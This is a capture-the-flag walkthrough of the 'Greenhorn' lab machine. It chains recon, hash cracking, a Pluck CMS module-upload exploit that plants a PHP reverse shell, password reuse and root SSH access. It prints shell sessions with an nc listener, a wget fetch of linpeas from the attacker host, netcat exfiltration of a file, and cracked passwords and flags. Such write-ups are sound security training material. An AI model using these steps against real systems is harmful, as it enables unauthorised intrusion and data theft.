---
title: "Greenhorn"
date: 2024-10-01
slug: "greenhorn"
tags: ["machines", "greenhorn", "walkthrough"]
cover: "/images/greenhorn/Pasted image 20241001144337.png"
summary: "Walkthrough of the Greenhorn Machines machine covering recon, exploitation, and privilege escalation."
---
## 1: Nmap
```shell
nmap 10.10.11.25 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 14:15 EEST
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 2.60% done; ETC: 14:23 (0:07:30 remaining)
Stats: 0:01:13 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 14:16 (0:00:00 remaining)
Nmap scan report for 10.10.11.25
Host is up (4.8s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 74.77 seconds

```

```shell
sudo nmap -sV -sC -p 22,80,3000 10.10.11.25 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 14:17 EEST
Nmap scan report for 10.10.11.25
Host is up (0.63s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://greenhorn.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=10/1%Time=66FBDA72%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.94 seconds

```

## 2: Inspecting Web

Add greenhorn.htb to /etc/hosts
Found this page
![greenhorn-1](/images/greenhorn/Pasted image 20241001144337.png)

there is a PoC on this plugin: https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC/tree/main and https://www.exploit-db.com/exploits/51592

however, we need a password in order to exploit this plugin, from the previous nmap, there is  a port 3000, so head over to it, and there is a register url

![greenhorn-2](/images/greenhorn/Pasted image 20241001144607.png)


![greenhorn-3](/images/greenhorn/Pasted image 20241001144805.png)

created a new user: charbel with password testtest

found this:
![greenhorn-4](/images/greenhorn/Pasted image 20241001145544.png)

found this:
![greenhorn-5](/images/greenhorn/Pasted image 20241001150411.png)

Identify hash: d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163

it is sha-512: now decrypt 

![greenhorn-6](/images/greenhorn/Pasted image 20241001150627.png)

the password: iloveyou1

now we have the password, use PoC

## 3: Obtain User Flag

Use the PoC to know the URL: admin.php?action=installmodule

And from the PoC we have to upload a malicious zip file which contains a reverse shell php file

Took one from pentest monkey and then zip it:
```shell
zip anything.zip anything.php
  adding: anything.php (deflated 60%)

```

then upload in the above URL
obtained a shell
![greenhorn-7](/images/greenhorn/Pasted image 20241001151640.png)

```shell
nc -nlvp 9001        
listening on [any] 9001 ...
connect to [10.10.16.75] from (UNKNOWN) [10.10.11.25] 34826
Linux greenhorn 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 12:16:24 up  3:00,  1 user,  load average: 0.03, 0.09, 0.16
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0    10.10.16.27      12:07    7:10   0.04s  0.00s /usr/bin/curl -s http://greenhorn.htb/?file=welcome-to-greenhorn
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ ls
bin
boot
cdrom
data
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cd /home
$ ls
git
junior
$ cd junior
$ ls
Using OpenVAS.pdf
user.txt
$ cat user.txt	
cat: user.txt: Permission denied
$ wget http://10.10.16.75/linpeas.sh
--2024-10-01 12:18:16--  http://10.10.16.75/linpeas.sh
Connecting to 10.10.16.75:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 824942 (806K) [text/x-sh]
linpeas.sh: Permission denied

Cannot write to 'linpeas.sh' (Permission denied).
$ cd ~
$ wget http://10.10.16.75/linpeas.sh
--2024-10-01 12:18:45--  http://10.10.16.75/linpeas.sh
Connecting to 10.10.16.75:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 824942 (806K) [text/x-sh]
linpeas.sh: Permission denied

Cannot write to 'linpeas.sh' (Permission denied).
$ wget http://10.10.16.75/linpeas.sh -o linpeas.sh
wget: linpeas.sh: Permission denied
$ pwd
/var/www
$ whoami
www-data
$ ls
html
$ su junior
Password: iloveyou1
ls
html
cd ~
ls
user.txt
Using OpenVAS.pdf
cat user.txt
6fde402e4829b699a23636fc9ae17cb5

```

user flag: 6fde402e4829b699a23636fc9ae17cb5

## 4: Obtain Root Flag

Transfer Using OpenVAS.pdf to our kali:
```shell
nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.16.75] from (UNKNOWN) [10.10.11.25] 42668
Linux greenhorn 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 12:38:26 up  3:22,  1 user,  load average: 0.07, 0.02, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0    10.10.16.27      12:07   29:12   0.18s  0.00s /usr/bin/curl -s http://greenhorn.htb/?file=welcome-to-greenhorn
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ su junior
Password: iloveyou1
cd ~
ls
user.txt
Using OpenVAS.pdf
nc -q 0 10.10.16.75 8000 < "Using OpenVAS.pdf"
ls
user.txt
Using OpenVAS.pdf



```

on kali: `nc -l -p 8000 > OpenVas.pdf`

This is the pdf:
![greenhorn-8](/images/greenhorn/Pasted image 20241001154457.png)

now we have to find this password

turn to png:
![greenhorn-9](/images/greenhorn/Pasted image 20241001161202.png)

![greenhorn-10](/images/greenhorn/Pasted image 20241001162412.png)


![greenhorn-11](/images/greenhorn/Pasted image 20241001162404.png)

![greenhorn-12](/images/greenhorn/Pasted image 20241001162436.png)

sidefromsidetheothersidesidefromsidetheotherside is the password

now try to ssh with root

```shell
ssh root@10.10.11.25     
root@10.10.11.25's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Oct  1 01:25:47 PM UTC 2024

  System load:  0.0               Processes:             224
  Usage of /:   57.0% of 3.45GB   Users logged in:       0
  Memory usage: 13%               IPv4 address for eth0: 10.10.11.25
  Swap usage:   0%


This system is built by the Bento project by Chef Software
More information can be found at https://github.com/chef/bento
Last login: Thu Jul 18 12:55:08 2024 from 10.10.14.41
root@greenhorn:~# ls
cleanup.sh  restart.sh  root.txt
root@greenhorn:~# cat root.txt
f6bb493b8724f283096c0481b5599a58
root@greenhorn:~# 

```

final flag: f6bb493b8724f283096c0481b5599a58
